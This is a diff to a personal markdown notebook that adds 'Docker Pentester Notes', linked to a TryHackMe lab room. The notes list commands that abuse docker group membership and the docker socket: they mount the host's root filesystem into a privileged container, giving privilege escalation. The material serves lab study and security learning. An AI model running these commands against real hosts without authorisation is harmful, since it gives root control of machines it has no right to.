@@ -521,6 +521,43 @@ networks:
 
 <hr class="sep-both">
 
+## Docker Pentester Notes ☠️
+
+[![chillhack](../../../../cybersecurity/_badges/thm-p/chillhack.svg)](https://tryhackme.com/room/chillhack)
+
+<div class="row row-cols-lg-2"><div>
+
+If a user is part of the docker group, they can interact with the docker daemon without `sudo`. This can be used for [privilege escalation](/cybersecurity/red-team/s4.privesc/index.md).
+
+```ps
+$ docker images
+$ docker run --privileged -v /:/hostfs <docker_image>
+$ docker run --privileged -v /:/hostfs <docker_image> bash
+$ docker run --privileged -v /:/hostfs <docker_image> ls
+```
+
+The associated docker server socket permissions:
+
+```ps
+$ find / -name "*.sock" -ls 2> /dev/null
+srw-rw---- 1 root docker [...] /run/docker.sock
+```
+
+Explicit usage of the socket:
+
+```ps
+$ docker -H unix:///run/docker.sock images
+$ docker -H unix:///run/docker.sock run --rm -d --privileged -v /:/hostfs xxx
+$ docker -H unix:///run/docker.sock run --rm -d --privileged -v /:/hostfs xxx bash
+$ docker -H unix:///run/docker.sock run --privileged -v /:/hostfs xxx ls
+```
+</div><div>
+
+...
+</div></div>
+
+<hr class="sep-both">
+
 ## 👻 To-do 👻
 
 Stuff that I found, but never read/used yet.
